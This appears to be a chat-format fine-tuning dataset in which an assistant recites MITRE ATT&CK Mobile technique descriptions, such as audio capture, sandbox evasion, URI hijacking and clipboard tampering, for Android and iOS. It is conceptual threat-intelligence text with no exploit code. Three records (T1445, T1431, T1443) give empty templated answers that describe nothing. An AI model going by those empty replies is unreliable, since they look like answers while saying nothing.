{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Client Software Binary' and with the Id: T1645 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Client Software Binary' and with the Id: T1645 is described as follows: Adversaries may modify system software binaries to establish persistent access to devices. System software binaries are used by the underlying operating system and users over adb or terminal emulators. Adversaries may make modifications to client software binaries to carry out malicious tasks when those binaries are executed. For example, malware may come with a pre-compiled malicious binary intended to overwrite the genuine one on the device. Since these binaries may be routinely executed by the system or user, the adversary can leverage this for persistent access to the device. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Software Packing' and with the Id: T1406.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Software Packing' and with the Id: T1406.002 is described as follows: Adversaries may perform software packing to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Utilities used to perform software packing are called packers. An example packer is FTT. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.. The systems targeted by this attack pattern are: iOS, Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Abuse of iOS Enterprise App Signing Key' and with the Id: T1445 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Abuse of iOS Enterprise App Signing Key' and with the Id: T1445 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploit SS7 to Track Device Location' and with the Id: T1450 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploit SS7 to Track Device Location' and with the Id: T1450 is described as follows: An adversary could exploit signaling system vulnerabilities to track the location of mobile devices. (Citation: Engel-SS7) (Citation: Engel-SS7-2008) (Citation: 3GPP-Security) (Citation: Positive-SS7) (Citation: CSRIC5-WG10-FinalReport). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Native API' and with the Id: T1575 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Native API' and with the Id: T1575 is described as follows: Adversaries may use Android\u2019s Native Development Kit (NDK) to write native functions that can achieve execution of binaries or functions. Like system calls on a traditional desktop operating system, native code achieves execution on a lower level than normal Android SDK calls.The NDK allows developers to write native code in C or C++ that is compiled directly to machine code, avoiding all intermediate languages and steps in compilation that higher level languages, like Java, typically have. The Java Native Interface (JNI) is the component that allows Java functions in the Android app to call functions in a native library.(Citation: Google NDK Getting Started)Adversaries may also choose to use native functions to execute malicious code since native actions are typically much more difficult to analyze than standard, non-native behaviors.(Citation: MITRE App Vetting Effectiveness). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Deliver Malicious App via Other Means' and with the Id: T1476 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Deliver Malicious App via Other Means' and with the Id: T1476 is described as follows: Malicious applications are a common attack vector used by adversaries to gain a presence on mobile devices. This technique describes installing a malicious application on targeted mobile devices without involving an authorized app store (e.g., Google Play Store or Apple App Store). Adversaries may wish to avoid placing malicious applications in an authorized app store due to increased potential risk of detection or other reasons. However, mobile devices often are configured to allow application installation only from an authorized app store which would prevent this technique from working.Delivery methods for the malicious application include:* [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) - Including the mobile app package as an attachment to an email message.* [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) - Including a link to the mobile app package within an email, text message (e.g. SMS, iMessage, Hangouts, WhatsApp, etc.), web site, QR code, or other means.* Third-Party App Store - Installed from a third-party app store (as opposed to an authorized app store that the device implicitly trusts as part of its default behavior), which may not apply the same level of scrutiny to apps as applied by an authorized app store.(Citation: IBTimes-ThirdParty)(Citation: TrendMicro-RootingMalware)(Citation: TrendMicro-FlappyBird)Some Android malware comes with functionality to install additional applications, either automatically or when the adversary instructs it to.(Citation: android-trojan-steals-paypal-2fa). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remotely Wipe Data Without Authorization' and with the Id: T1469 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remotely Wipe Data Without Authorization' and with the Id: T1469 is described as follows: An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an EMM console could use that access to wipe enrolled devices (Citation: Honan-Hacking).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation for Client Execution' and with the Id: T1658 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation for Client Execution' and with the Id: T1658 is described as follows: Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to insecure coding practices that can lead to unanticipated behavior. Adversaries may take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility. Adversaries may use device-based zero-click exploits for code execution. These exploits are powerful because there is no user interaction required for code execution. ### SMS/iMessage Delivery  SMS and iMessage in iOS are common targets through [Drive-By Compromise](https://attack.mitre.org/techniques/T1456), [Phishing](https://attack.mitre.org/techniques/T1660), etc. Adversaries may use embed malicious links, files, etc. in SMS messages or iMessages. Mobile devices may be compromised through one-click exploits, where the victim must interact with a text message, or zero-click exploits, where no user interaction is required. ### AirDrop Unique to iOS, AirDrop is a network protocol that allows iOS users to transfer files between iOS devices. Before patches from Apple were released, on iOS 13.4 and earlier, adversaries may force the Apple Wireless Direct Link (AWDL) interface to activate, then exploit a buffer overflow to gain access to the device and run as root without interaction from the user.  . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Proxy Through Victim' and with the Id: T1604 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Proxy Through Victim' and with the Id: T1604 is described as follows: Adversaries may use a compromised device as a proxy server to the Internet. By utilizing a proxy, adversaries hide the true IP address of their C2 server and associated infrastructure from the destination of the network traffic. This masquerades an adversary\u2019s traffic as legitimate traffic originating from the compromised device, which can evade IP-based restrictions and alerts on certain services, such as bank accounts and social media websites.(Citation: Threat Fabric Exobot)The most common type of proxy is a SOCKS proxy. It can typically be implemented using standard OS-level APIs and 3rd party libraries with no indication to the user. On Android, adversaries can use the `Proxy` API to programmatically establish a SOCKS proxy connection, or lower-level APIs to interact directly with raw sockets.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Generation Algorithms' and with the Id: T1520 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Generation Algorithms' and with the Id: T1520 is described as follows: Adversaries may use [Domain Generation Algorithms](https://attack.mitre.org/techniques/T1520) (DGAs) to procedurally generate domain names for command and control communication, and other uses such as malicious application distribution.(Citation: securelist rotexy 2018)DGAs increase the difficulty for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Access Calendar Entries' and with the Id: T1435 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Access Calendar Entries' and with the Id: T1435 is described as follows: An adversary could call standard operating system APIs from a malicious application to gather calendar entry data, or with escalated privileges could directly access files containing calendar data.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Rogue Wi-Fi Access Points' and with the Id: T1465 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Rogue Wi-Fi Access Points' and with the Id: T1465 is described as follows: An adversary could set up unauthorized Wi-Fi access points or compromise existing access points and, if the device connects to them, carry out network-based attacks such as eavesdropping on or modifying network communication(Citation: NIST-SP800153)(Citation: Kaspersky-DarkHotel).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Foreground Persistence' and with the Id: T1541 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Foreground Persistence' and with the Id: T1541 is described as follows: Adversaries may abuse Android's `startForeground()` API method to maintain continuous sensor access. Beginning in Android 9, idle applications running in the background no longer have access to device sensors, such as the camera, microphone, and gyroscope.(Citation: Android-SensorsOverview) Applications can retain sensor access by running in the foreground, using Android\u2019s `startForeground()` API method. This informs the system that the user is actively interacting with the application, and it should not be killed. The only requirement to start a foreground service is showing a persistent notification to the user.(Citation: Android-ForegroundServices)Malicious applications may abuse the `startForeground()` API method to continue running in the foreground, while presenting a notification to the user pretending to be a genuine application. This would allow unhindered access to the device\u2019s sensors, assuming permission has been previously granted.(Citation: BlackHat Sutter Android Foreground 2019)Malicious applications may also abuse the `startForeground()` API to inform the Android system that the user is actively interacting with the application, thus preventing it from being killed by the low memory killer.(Citation: TrendMicro-Yellow Camera). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Replication Through Removable Media' and with the Id: T1458 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Replication Through Removable Media' and with the Id: T1458 is described as follows: Adversaries may move onto devices by exploiting or copying malware to devices connected via USB. In the case of Lateral Movement, adversaries may utilize the physical connection of a device to a compromised or malicious charging station or PC to bypass application store requirements and install malicious applications directly.(Citation: Lau-Mactans) In the case of Initial Access, adversaries may attempt to exploit the device via the connection to gain access to data stored on the device.(Citation: Krebs-JuiceJacking) Examples of this include:  * Exploiting insecure bootloaders in a Nexus 6 or 6P device over USB and gaining the ability to perform actions including intercepting phone calls, intercepting network traffic, and obtaining the device physical location.(Citation: IBM-NexusUSB) * Exploiting weakly-enforced security boundaries in Android devices such as the Google Pixel 2 over USB.(Citation: GoogleProjectZero-OATmeal) * Products from Cellebrite and Grayshift purportedly that can exploit some iOS devices using physical access to the data port to unlock the passcode.(Citation: Computerworld-iPhoneCracking) . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Audio Capture' and with the Id: T1429 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Audio Capture' and with the Id: T1429 is described as follows: Adversaries may capture audio to collect information by leveraging standard operating system APIs of a mobile device. Examples of audio information adversaries may target include user conversations, surroundings, phone calls, or other sensitive information.  Android and iOS, by default, require that applications request device microphone access from the user.   On Android devices, applications must hold the `RECORD_AUDIO` permission to access the microphone or the `CAPTURE_AUDIO_OUTPUT` permission to access audio output. Because Android does not allow third-party applications to hold the `CAPTURE_AUDIO_OUTPUT` permission by default, only privileged applications, such as those distributed by Google or the device vendor, can access audio output.(Citation: Android Permissions) However, adversaries may be able to gain this access after successfully elevating their privileges. With the `CAPTURE_AUDIO_OUTPUT` permission, adversaries may pass the `MediaRecorder.AudioSource.VOICE_CALL` constant to `MediaRecorder.setAudioOutput`, allowing capture of both voice call uplink and downlink.(Citation: Manifest.permission)  On iOS devices, applications must include the `NSMicrophoneUsageDescription` key in their `Info.plist` file to access the microphone.(Citation: Requesting Auth-Media Capture). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hijack Execution Flow' and with the Id: T1625 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hijack Execution Flow' and with the Id: T1625 is described as follows: Adversaries may execute their own malicious payloads by hijacking the way operating systems run applications. Hijacking execution flow can be for the purposes of persistence since this hijacked execution may reoccur over time. There are many ways an adversary may hijack the flow of execution. A primary way is by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs or resources, such as file directories, could also be poisoned to include malicious payloads.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Unix Shell' and with the Id: T1623.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Unix Shell' and with the Id: T1623.001 is described as follows: Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the underlying command prompts on Android and iOS devices. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges that are only accessible if the device has been rooted or jailbroken. Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems. Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence. If the device has been rooted or jailbroken, adversaries may locate and invoke a superuser binary to elevate their privileges and interact with the system as the root user. This dangerous level of permissions allows the adversary to run special commands and modify protected system files.  . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Application Layer Protocol' and with the Id: T1437 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Application Layer Protocol' and with the Id: T1437 is described as follows: Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the mobile device, and often the results of those commands, will be embedded within the protocol traffic between the mobile device and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'App Delivered via Web Download' and with the Id: T1431 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'App Delivered via Web Download' and with the Id: T1431 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Download New Code at Runtime' and with the Id: T1407 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Download New Code at Runtime' and with the Id: T1407 is described as follows: Adversaries may download and execute dynamic code not included in the original application package after installation. This technique is primarily used to evade static analysis checks and pre-publication scans in official app stores. In some cases, more advanced dynamic or behavioral analysis techniques could detect this behavior. However, in conjunction with [Execution Guardrails](https://attack.mitre.org/techniques/T1627) techniques, detecting malicious code downloaded after installation could be difficult.On Android, dynamic code could include native code, Dalvik code, or JavaScript code that utilizes Android WebView\u2019s `JavascriptInterface` capability. On iOS, dynamic code could be downloaded and executed through 3rd party libraries such as JSPatch. (Citation: FireEye-JSPatch) . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation for Initial Access' and with the Id: T1664 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation for Initial Access' and with the Id: T1664 is described as follows: Adversaries may exploit software vulnerabilities to gain initial access to a mobile device. This can be accomplished in a variety of ways. Vulnerabilities may be present in applications, services, the underlying operating system, or in the kernel itself. Several well-known mobile device exploits exist, including FORCEDENTRY, StageFright, and BlueBorne. Further, some exploits may be possible to exploit without any user interaction (zero-click), making them particularly dangerous. Mobile operating system vendors are typically very quick to patch such critical bugs, ensuring only a small window where they can be exploited. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remotely Track Device Without Authorization' and with the Id: T1468 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remotely Track Device Without Authorization' and with the Id: T1468 is described as follows: An adversary who is able to obtain unauthorized access to or misuse authorized access to cloud services (e.g. Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an enterprise mobility management (EMM) / mobile device management (MDM) server console could use that access to track mobile devices.(Citation: Krebs-Location). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Checks' and with the Id: T1633.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Checks' and with the Id: T1633.001 is described as follows: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behavior after checking for the presence of artifacts indicative of a virtual environment or sandbox. If the adversary detects a virtual environment, they may alter their malware\u2019s behavior to disengage from the victim or conceal the core functions of the implant. They may also search for virtualization artifacts before dropping secondary or additional payloads. Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Hardware checks, such as the presence of motion sensors, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Stored Application Data' and with the Id: T1409 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Stored Application Data' and with the Id: T1409 is described as follows: Adversaries may try to access and collect application data resident on the device. Adversaries often target popular applications, such as Facebook, WeChat, and Gmail.(Citation: SWB Exodus March 2019)  Due to mobile OS sandboxing, this technique is only possible in three scenarios:  * An application stores files in unprotected external storage * An application stores files in its internal storage directory with insecure permissions (e.g. 777) * The adversary gains root permissions on the device . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Screen Capture' and with the Id: T1513 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Screen Capture' and with the Id: T1513 is described as follows: Adversaries may use screen capture to collect additional information about a target device, such as applications running in the foreground, user data, credentials, or other sensitive information. Applications running in the background can capture screenshots or videos of another application running in the foreground by using the Android `MediaProjectionManager` (generally requires the device user to grant consent).(Citation: Fortinet screencap July 2019)(Citation: Android ScreenCap1 2019) Background applications can also use Android accessibility services to capture screen contents being displayed by a foreground application.(Citation: Lookout-Monokle) An adversary with root access or Android Debug Bridge (adb) access could call the Android `screencap` or `screenrecord` commands.(Citation: Android ScreenCap2 2019)(Citation: Trend Micro ScreenCap July 2015) . The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Transmitted Data Manipulation' and with the Id: T1641.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Transmitted Data Manipulation' and with the Id: T1641.001 is described as follows: Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, or decision making.Manipulation may be possible over a network connection or between system processes where there is an opportunity to deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system, typically gained through a prolonged information gathering campaign, in order to have the desired impact.One method to achieve [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1641/001) is by modifying the contents of the device clipboard. Malicious applications may monitor clipboard activity through the `ClipboardManager.OnPrimaryClipChangedListener` interface on Android to determine when clipboard contents have changed. Listening to clipboard activity, reading clipboard contents, and modifying clipboard contents requires no explicit application permissions and can be performed by applications running in the background. However, this behavior has changed with the release of Android 10.Adversaries may use [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1641/001) to replace text prior to being pasted. For example, replacing a copied Bitcoin wallet address with a wallet address that is under adversarial control.[Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1641/001) was seen within the Android/Clipper.C trojan. This sample was detected by ESET in an application distributed through the Google Play Store targeting cryptocurrency wallet numbers.(Citation: ESET Clipboard Modification February 2019). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Manipulate App Store Rankings or Ratings' and with the Id: T1452 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Manipulate App Store Rankings or Ratings' and with the Id: T1452 is described as follows: An adversary could use access to a compromised device's credentials to attempt to manipulate app store rankings or ratings by triggering application downloads or posting fake reviews of applications. This technique likely requires privileged access (a rooted or jailbroken device).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'URI Hijacking' and with the Id: T1416 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'URI Hijacking' and with the Id: T1416 is described as follows: Adversaries may register Uniform Resource Identifiers (URIs) to intercept sensitive data.Applications regularly register URIs with the operating system to act as a response handler for various actions, such as logging into an app using an external account via single sign-on. This allows redirections to that specific URI to be intercepted by the application. If a malicious application were to register for a URI that was already in use by a genuine application, the malicious application may be able to intercept data intended for the genuine application or perform a phishing attack against the genuine application. Intercepted data may include OAuth authorization codes or tokens that could be used by the malicious application to gain access to resources.(Citation: Trend Micro iOS URL Hijacking)(Citation: IETF-PKCE). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compromise Software Dependencies and Development Tools' and with the Id: T1474.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compromise Software Dependencies and Development Tools' and with the Id: T1474.001 is described as follows: Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Grace-Advertisement). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Evade Analysis Environment' and with the Id: T1523 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Evade Analysis Environment' and with the Id: T1523 is described as follows: Malicious applications may attempt to detect their operating environment prior to fully executing their payloads. These checks are often used to ensure the application is not running within an analysis environment such as a sandbox used for application vetting, security research, or reverse engineering. Adversaries may use many different checks such as physical sensors, location, and system properties to fingerprint emulators and sandbox environments.(Citation: Talos Gustuff Apr 2019)(Citation: ThreatFabric Cerberus)(Citation: Xiao-ZergHelper)(Citation: Cyberscoop Evade Analysis January 2019) Adversaries may access `android.os.SystemProperties` via Java reflection to obtain specific system information.(Citation: Github Anti-emulator) Standard values such as phone number, IMEI, IMSI, device IDs, and device drivers may be checked against default signatures of common sandboxes.(Citation: Sophos Anti-emulation). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'URI Hijacking' and with the Id: T1635.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'URI Hijacking' and with the Id: T1635.001 is described as follows: Adversaries may register Uniform Resource Identifiers (URIs) to intercept sensitive data. Applications regularly register URIs with the operating system to act as a response handler for various actions, such as logging into an app using an external account via single sign-on. This allows redirections to that specific URI to be intercepted by the application. If an adversary were to register for a URI that was already in use by a genuine application, the adversary may be able to intercept data intended for the genuine application or perform a phishing attack against the genuine application. Intercepted data may include OAuth authorization codes or tokens that could be used by the adversary to gain access to protected resources.(Citation: Trend Micro iOS URL Hijacking)(Citation: IETF-PKCE) . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Subvert Trust Controls' and with the Id: T1632 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Subvert Trust Controls' and with the Id: T1632 is described as follows: Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted applications. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features include: an app being allowed to run because it is signed by a valid code signing certificate; an OS prompt alerting the user that an app came from an untrusted source; or getting an indication that you are about to connect to an untrusted site. The method adversaries use will depend on the specific mechanism they seek to subvert. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Access Call Log' and with the Id: T1433 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Access Call Log' and with the Id: T1433 is described as follows: On Android, an adversary could call standard operating system APIs from a malicious application to gather call log data, or with escalated privileges could directly access files containing call log data.On iOS, applications do not have access to the call log, so privilege escalation would be required in order to access the data.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Geofencing' and with the Id: T1581 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Geofencing' and with the Id: T1581 is described as follows: Adversaries may use a device\u2019s geographical location to limit certain malicious behaviors. For example, malware operators may limit the distribution of a second stage payload to certain geographic regions.(Citation: Lookout eSurv)[Geofencing](https://attack.mitre.org/techniques/T1581) is accomplished by persuading the user to grant the application permission to access location services. The application can then collect, process, and exfiltrate the device\u2019s location to perform location-based actions, such as ceasing malicious behavior or showing region-specific advertisements.One method to accomplish [Geofencing](https://attack.mitre.org/techniques/T1581) on Android is to use the built-in Geofencing API to automatically trigger certain behaviors when the device enters or exits a specified radius around a geographical location. Similar to other [Geofencing](https://attack.mitre.org/techniques/T1581) methods, this requires that the user has granted the `ACCESS_FINE_LOCATION` and `ACCESS_BACKGROUND_LOCATION` permissions. The latter is only required if the application targets Android 10 (API level 29) or higher. However, Android 11 introduced additional permission controls that may restrict background location collection based on user permission choices at runtime. These additional controls include \u201cAllow only while using the app\u201d, which will effectively prohibit background location collection.(Citation: Android Geofencing API)Similarly, on iOS, developers can use built-in APIs to setup and execute geofencing. Depending on the use case, the app will either need to call `requestWhenInUseAuthorization()` or `requestAlwaysAuthorization()`, depending on when access to the location services is required. Similar to Android, users also have the option to limit when the application can access the device\u2019s location, including one-time use and only when the application is running in the foreground.(Citation: Apple Location Services)[Geofencing](https://attack.mitre.org/techniques/T1581) can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. For example, location data could be used to limit malware spread and/or capabilities, which could also potentially evade application analysis environments (ex: malware analysis outside of the target geographic area). Other malicious usages could include showing language-specific [Input Prompt](https://attack.mitre.org/techniques/T1411)s and/or advertisements.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Device Administrator Permissions' and with the Id: T1401 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Device Administrator Permissions' and with the Id: T1401 is described as follows: Adversaries may request device administrator permissions to perform malicious actions.By abusing the device administration API, adversaries can perform several nefarious actions, such as resetting the device\u2019s password for [Device Lockout](https://attack.mitre.org/techniques/T1446), factory resetting the device to [Delete Device Data](https://attack.mitre.org/techniques/T1447) and any traces of the malware, disabling all of the device\u2019s cameras, or make it more difficult to uninstall the app.(Citation: Android DeviceAdminInfo)Device administrators must be approved by the user at runtime, with a system popup showing which of the actions have been requested by the app. In conjunction with other techniques, such as [Input Injection](https://attack.mitre.org/techniques/T1516), an app can programmatically grant itself administrator permissions without any user input.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remotely Install Application' and with the Id: T1443 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remotely Install Application' and with the Id: T1443 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
